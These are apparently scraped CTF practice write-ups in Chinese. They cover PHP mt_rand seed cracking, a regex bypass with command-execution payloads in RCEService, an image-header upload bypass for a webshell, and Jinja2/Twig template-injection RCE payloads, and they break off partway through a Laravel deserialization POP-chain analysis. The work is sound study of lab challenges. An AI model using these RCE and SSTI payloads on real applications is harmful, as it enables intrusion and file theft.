<p><a href="https://blog.csdn.net/qq_42096378/article/details/123489782">https://blog.csdn.net/qq_42096378/article/details/123489782</a></p>
<h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><h4 id="伪随机数"><a href="#伪随机数" class="headerlink" title="伪随机数"></a>伪随机数</h4><p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304162311117.png" alt="image-20230416152545624"></p>
<p>打开啥都没有，常规看源码，浏览发现有个check.php，访问一下，有个源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">NZnGBX2Kp8</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=substr(<span class="variable">$str_long1</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str_show</span> = substr(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str_show</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]===<span class="variable">$str</span>)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="string">&quot;check.php&quot;</span>); </span><br></pre></td></tr></table></figure>

<p>这道题目考察的是伪随机数，先了解一下基本的知识：</p>
<p>mt_rand函数</p>
<blockquote>
<p>mt_ rand() 函数使用Mersenne Twister 算法生成随机整数。<br>使用语法: mt_ <em>rand(); or mt</em> rand(min,max);, 生成一个区间内的随机数。其参数min默认为最小值0，max默认为可生成的随机数最大值2147483647，由mt_ getrandmax ()函数获得。</p>
</blockquote>
<p>mt_srand() 函数</p>
<blockquote>
<p>mt_srand() 函数播种Mersenne Twister随机数生成器。<br>提示:从PHP 4.2.0开始，随机数生成器自动播种，因此没有必要使用该函数。当不使用随机数播种函数srand时，php也会自动为随机数播种，因此是否确定种子都不会影响正常运行。</p>
</blockquote>
<p>mt_srand(seed)分发种子，相当于进行产生随机数的初始化，然后通过mt_rand函数获得种子，但是这个随机数并不是真正的随机，他是有可预测性的，如果我们能获得种子，就一定程度上可以获得产生的随机数，根据这个随机数进行验证的部分就不安全了</p>
<p>种子固定的情况下，mt_srand($_SESSION[‘seed’]);每次产生的随机数的顺序也是固定的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">mt_srand(<span class="number">12345</span>);    </span><br><span class="line"><span class="keyword">echo</span> mt_rand().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line"><span class="comment">//162946439</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">mt_srand(<span class="number">12345</span>);    </span><br><span class="line"><span class="keyword">echo</span> mt_rand().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> mt_rand().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> mt_rand().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//162946439</span></span><br><span class="line"><span class="comment">//247161732</span></span><br><span class="line"><span class="comment">//1463094264</span></span><br></pre></td></tr></table></figure>

<p>发现第一个数一样的，生成伪随机数是线性的，你可以理解为y=ax,x就是种子，知道种子和一组伪随机数就可以推y(伪随机数)</p>
<p>详细了解伪随机数的看这两篇文章（比较全），第一次接触到</p>
<p><a href="https://www.freebuf.com/vuls/192012.html">https://www.freebuf.com/vuls/192012.html</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//爆破脚本模板，先是把字母还原成为生成的随机数，然后在拼接成php_mt_seed需要的参数</span></span><br><span class="line"><span class="comment">//对比出来，位数可以不一样，但种子一样</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$pass_now</span> = <span class="string">&quot;JRgFARBBkX&quot;</span>;</span><br><span class="line"> <span class="variable">$allowable_characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line"> <span class="variable">$len</span> = strlen(<span class="variable">$allowable_characters</span>) - <span class="number">1</span>;</span><br><span class="line"> <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; strlen(<span class="variable">$pass_now</span>); <span class="variable">$j</span>++)</span><br><span class="line"> 	&#123;</span><br><span class="line"> 	<span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line"> 		<span class="keyword">if</span>(<span class="variable">$pass_now</span>[<span class="variable">$j</span>] == <span class="variable">$allowable_characters</span>[<span class="variable">$i</span>])</span><br><span class="line"> 		&#123;</span><br><span class="line"> 			<span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$i</span> <span class="subst">$i</span> 0 <span class="subst">$len</span> &quot;</span>;</span><br><span class="line"> 			<span class="keyword">break</span>;</span><br><span class="line"> 		&#125;</span><br><span class="line"> 	&#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">//py版本</span><br><span class="line">str1 =<span class="string">&#x27;JRgFARBBkX&#x27;</span></span><br><span class="line">str2 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">result =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">length = <span class="built_in">str</span>(<span class="built_in">len</span>(str2)-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(str1)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(str2)):</span><br><span class="line">        <span class="keyword">if</span> str1[i] ==  str2[j]:</span><br><span class="line">            result += <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> +<span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + length + <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">60 60 0 61 6 6 0 61 15 15 0 61 9 9 0 61 52 52 0 61 13 13 0 61 47 47 0 61 13 13 0 61 9 9 0 61 43 43 0 61</span><br></pre></td></tr></table></figure>

<p>php_mt_seed的使用</p>
<p>下载：<a href="https://www.openwall.com/php_mt_seed/">https://www.openwall.com/php_mt_seed/</a></p>
<blockquote>
<p>官方给的readme里这样说明它的命令行语法</p>
<p>php_mt_seed 在其命令行上需要 1、2、4 或更多数字。这些数字指定了 mt_rand() 输出的约束。<br>当仅使用 1 个数字调用时，这是要为其查找种子的第一个 mt_rand() 输出。<br>当使用 2 个数字调用时，这些是第一个 mt_rand() 输出应落入的范围（按此顺序排列的最小值和最大值）。<br>当使用 4 个数字调用时，前 2 个给出第一个 mt_rand() 输出的范围，第二个 2 给出传递给 mt_rand() 的范围。<br>当使用 5 个或更多数字调用时，每组 4，然后是最后一组 1、2 或（通常）4，如上处理，其中每组引用相应的 mt_rand() 输出</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./php_mt_seed 60 60 0 61 6 6 0 61 15 15 0 61 9 9 0 61 52 52 0 61 13 13 0 61 47 47 0 61 13 13 0 61 9 9 0 61 43 43 0 61</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304161713616.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//结果：159779002</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(种子);</span><br><span class="line"></span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=substr(<span class="variable">$str_long1</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>方法应该是没错的，但是试了N遍flag都不对，不知道为什么，如果试了不行还是参考一下其他大神的吧，麻了</p>
<h2 id="RCEService"><a href="#RCEService" class="headerlink" title="RCEService"></a>RCEService</h2><h4 id="json格式，换行绕preg，环境变量，或者超回溯上限绕preg"><a href="#json格式，换行绕preg，环境变量，或者超回溯上限绕preg" class="headerlink" title="json格式，换行绕preg，环境变量，或者超回溯上限绕preg"></a>json格式，换行绕preg，环境变量，或者超回溯上限绕preg</h4><p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304162311658.png" alt="image-20230416223646009"></p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304162231671.png" alt="image-20230416223102604"></p>
<p>题目让我门输入 JSON格式，又是rce 输入下{“cmd’:”ls”}查看一下当前目录下的文件 ，json是以键值对的形式存在的。</p>
<p>之后cat一下index，不行，大概率是过滤掉了，但是也没找到源码，不知道是过滤了哪些，后面看网上给出了源码，也不知道是怎么来的，有人说是比赛当时是有给出的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line">putenv(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$json</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (!is_string(<span class="variable">$json</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (preg_match(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$cmd</span> = json_decode(<span class="variable">$json</span>, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$cmd</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">            system(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>分析一下：</p>
<p>主要需要注意的有</p>
<p>1.一开始设置的环境变量</p>
<p>2.正则过滤了一大堆东西，这么多应该也是有特别的方法绕过了</p>
<p>这里的正则匹配是以 **.***来匹配变量json的前后结束。可以使用%0a来进行绕过，因为preg_match不是多行匹配，所以在匹配的时候不会匹配%0a</p>
<table>
<thead>
<tr>
<th><strong>m</strong></th>
<th><strong>使边界字符 ^ 和 $ 匹配每一行的开头和结尾，记住是多行，而不是整个字符串的开头和结尾。</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>s</strong></td>
<td><strong>默认情况下的圆点 . 是匹配除换行符 \n 之外的任何字符，加上 s 修饰符之后, . 中包含换行符 \n。</strong></td>
</tr>
</tbody></table>
<p>本题也是设置了环境变量，只能用绝对路径来调用系统命令，用nl,cat等命令都是出不来的，系统命令需要有特定的环境变量的也就是路径，系统找不到该路径下的exe文件怎么执行系统命令</p>
<p>只能调用绝对路径下的命令，cat命令就在/bin/目录下面</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">putenv(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><strong>playload</strong></p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="number">0</span>A<span class="string">&quot;cmd&quot;</span>: <span class="string">&quot;/bin/cat /home/rceservice/flag&quot;</span>%<span class="number">0</span>A&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304162308335.png"></p>
<p>还有一种方法，就是用preg_match的回溯限制</p>
<p>下面就参考一下p神的文章了，感觉通俗易懂</p>
<p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;题目地址&#x27;</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&#x27;cmd&#x27;</span>:<span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;succ3&quot;:&quot;&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">1000000</span>+<span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url=url,data=payload)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p>参考文章：<a href="https://blog.csdn.net/qq_54929891/article/details/123804652?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-123804652-blog-125019111.235%5Ev29%5Epc_relevant_default_base3&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-123804652-blog-125019111.235%5Ev29%5Epc_relevant_default_base3&amp;utm_relevant_index=2">https://blog.csdn.net/qq_54929891/article/details/123804652?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-123804652-blog-125019111.235%5Ev29%5Epc_relevant_default_base3&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-123804652-blog-125019111.235%5Ev29%5Epc_relevant_default_base3&amp;utm_relevant_index=2</a></p>
]]></content>
      <categories>
        <category>web ctf</category>
      </categories>
      <tags>
        <tag>随意刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>随意刷题02</title>
    <url>/p/8491aa71.html</url>
    <content><![CDATA[<p>菜狗一个，如有错误，不要见怪</p>
<h2 id="随意刷题02"><a href="#随意刷题02" class="headerlink" title="随意刷题02"></a>随意刷题02</h2><h3 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h3><h4 id="文件头绕过"><a href="#文件头绕过" class="headerlink" title="文件头绕过"></a>文件头绕过</h4><p>进入题目，一个复杂得页面，可以注册登录，别一直尝试sql了，试试看登录后面有没有东西，发现可以上传头像，大概率是文件上传漏洞了</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304170930247.png" alt="image-20230417093019854"></p>
<p>这里给错了错误信息，显然是利用GIF89a绕过</p>
<blockquote>
<p>exif_imagetype<br>(PHP 4 &gt;= 4.3.0, PHP 5, PHP 7, PHP 8)<br>exif_imagetype — 判断一个图像的类型，exif_imagetype() 读取一个图像的第一个字节并检查其签名。</p>
</blockquote>
<p>一句话木马拿下即可</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304170947703.png" alt="image-20230417094704610"></p>
<p>再到蚁剑里面找吧</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304170949963.png" alt="image-20230417094929910"></p>
<h3 id="I-lt-3-Flask"><a href="#I-lt-3-Flask" class="headerlink" title="I_&lt;3_Flask"></a>I_&lt;3_Flask</h3><h4 id="SSTi"><a href="#SSTi" class="headerlink" title="SSTi"></a>SSTi</h4><p>感觉最近老是遇到这个知识点，核心还是要认真搞懂那些命令</p>
<p>题目显示这flask，猜测应该是模板注入，查找一番后，发现啥都没有，想试一下注入的前提也是要参数的，后面学到了一个工具叫Arjun</p>
<p><strong>下载安装</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/s0md3v/Arjun.git</span><br></pre></td></tr></table></figure>

<p>这里我用了是kali装的，如果没装成功可以百度看一下</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304171132501.png" alt="image-20230417113227420"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 arjun -u http://5508069d-d2ab-4ce3-b6fb-7a3444f8f2cf.node4.buuoj.cn:81/ -c 100 -d 1</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304171209867.png" alt="image-20230417120936814"></p>
<p>爆破出了参数name</p>
<p>下面还要测试一下是ssti里面的哪一个注入</p>
<p>确定哪个模板注入的一般流程：</p>
<blockquote>
<p>在疑似注入点的地方输入${7<em>7},如果有结果为49</em></p>
<p>继续输入a{<em>comment</em>}b,成功则是smarty引擎，以此类推</p>
<p>有些时候不同的模板引擎对同一输入49都有结果</p>
<p>但是在Twig中结果是49，在jinja2中是7777777。</p>
</blockquote>
<p>本道题目是jinja2注入</p>
<p>先看目录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[182].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>找到flag.txt</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304171228970.png" alt="image-20230417122338748"></p>
<p>再cat</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__([182].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;].__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>ssti的几个注入真的很多</p>
<p>twig模板引擎：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>Jinjia2模板引擎通用的RCE Payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;&lt;command&gt;&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>参考文章：</p>
<p><a href="https://blog.csdn.net/weixin_45646006/article/details/120519927">https://blog.csdn.net/weixin_45646006/article/details/120519927</a></p>
<p><a href="https://blog.csdn.net/weixin_54515836/article/details/113778233">https://blog.csdn.net/weixin_54515836/article/details/113778233</a></p>
<p><a href="https://blog.csdn.net/qq_44657899/article/details/104307948?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-7&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/qq_44657899/article/details/104307948?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-7&amp;spm=1001.2101.3001.4242</a></p>
]]></content>
      <categories>
        <category>web ctf</category>
      </categories>
      <tags>
        <tag>随意刷题02</tag>
      </tags>
  </entry>
  <entry>
    <title>随意刷题04</title>
    <url>/p/6df20f44.html</url>
    <content><![CDATA[<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>感觉得回顾一下这个知识，学会基本的构造pop链，以前本就不太熟，浑水摸鱼过去，得学学，原理的那些可以看一下网上的</p>
<h3 id="CISCN2019-总决赛-Day1-Web4-Laravel1"><a href="#CISCN2019-总决赛-Day1-Web4-Laravel1" class="headerlink" title="[CISCN2019 总决赛 Day1 Web4]Laravel1"></a>[CISCN2019 总决赛 Day1 Web4]Laravel1</h3><h4 id="代码审计构造pop链"><a href="#代码审计构造pop链" class="headerlink" title="代码审计构造pop链"></a>代码审计构造pop链</h4><p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/image-20230420131838017.png" alt="image-20230420131838017"></p>
<p>题目提示源码，比较简洁，下载源码分析一下，明显是反序列化了，打开一看，发现很多的文件，代码难度有点大，pop链难找</p>
<p>反序列化的一般思路:</p>
<blockquote>
<p>1、找一下魔术方法_destruct()</p>
<p>2、找找类中有没有可控的命令执行命令，或方法可以调用其他类可控的命令执行命令</p>
<p>3、然后全局搜索能利用的可控函数</p>
<p>4、进而构造出一条pop链</p>
</blockquote>
<p>搜一下_destruct()</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/image-20230420132835623.png" alt="image-20230420132835623"></p>
<p>也可以找个审计软件看看</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/image-20230420133526433.png" alt="image-20230420133526433"></p>
<p>一堆，还要一个个点进去看一下是否有问题，后面不知道找哪了，就看wp了，需要的是这个源头</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/image-20230420133804232.png" alt="image-20230420133804232"></p>
<p>而这个commit方法调用了invalidateTags（）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">commit</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;invalidateTags([]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>找找看invalidateTags，找到的不多，其中感觉这个最关键</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">invalidateTags</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$tags</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="variable">$ok</span> = <span class="literal">true</span>;</span><br><span class="line">     <span class="variable">$tagsByKey</span> = [];</span><br><span class="line">     <span class="variable">$invalidatedTags</span> = [];</span><br><span class="line">     <span class="keyword">foreach</span> (<span class="variable">$tags</span> <span class="keyword">as</span> <span class="variable">$tag</span>) &#123;</span><br><span class="line">         CacheItem::validateKey(<span class="variable">$tag</span>);</span><br><span class="line">         <span class="variable">$invalidatedTags</span>[<span class="variable">$tag</span>] = <span class="number">0</span>;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;deferred) &#123;</span><br><span class="line">         <span class="variable">$items</span> = <span class="keyword">$this</span>-&gt;deferred;</span><br><span class="line">         <span class="keyword">foreach</span> (<span class="variable">$items</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$item</span>) &#123;</span><br><span class="line">             <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;pool-&gt;saveDeferred(<span class="variable">$item</span>)) &#123;</span><br><span class="line">                 <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;deferred[<span class="variable">$key</span>]);</span><br><span class="line">                 <span class="variable">$ok</span> = <span class="literal">false</span>;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="variable">$f</span> = <span class="keyword">$this</span>-&gt;getTagsByKey;</span><br><span class="line">         <span class="variable">$tagsByKey</span> = <span class="variable">$f</span>(<span class="variable">$items</span>);</span><br><span class="line">         <span class="keyword">$this</span>-&gt;deferred = [];</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="variable">$tagVersions</span> = <span class="keyword">$this</span>-&gt;getTagVersions(<span class="variable">$tagsByKey</span>, <span class="variable">$invalidatedTags</span>);</span><br><span class="line">     <span class="variable">$f</span> = <span class="keyword">$this</span>-&gt;createCacheItem;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">foreach</span> (<span class="variable">$tagsByKey</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$tags</span>) &#123;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;pool-&gt;saveDeferred(<span class="variable">$f</span>(<span class="built_in">static</span>::TAGS_PREFIX.<span class="variable">$key</span>, array_intersect_key(<span class="variable">$tagVersions</span>, <span class="variable">$tags</span>), <span class="variable">$items</span>[<span class="variable">$key</span>]));</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="variable">$ok</span> = <span class="keyword">$this</span>-&gt;pool-&gt;commit() &amp;&amp; <span class="variable">$ok</span>;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$invalidatedTags</span>) &#123;</span><br><span class="line">         <span class="variable">$f</span> = <span class="keyword">$this</span>-&gt;invalidateTags;</span><br><span class="line">         <span class="variable">$ok</span> = <span class="variable">$f</span>(<span class="keyword">$this</span>-&gt;tags, <span class="variable">$invalidatedTags</span>) &amp;&amp; <span class="variable">$ok</span>;</span><br><span 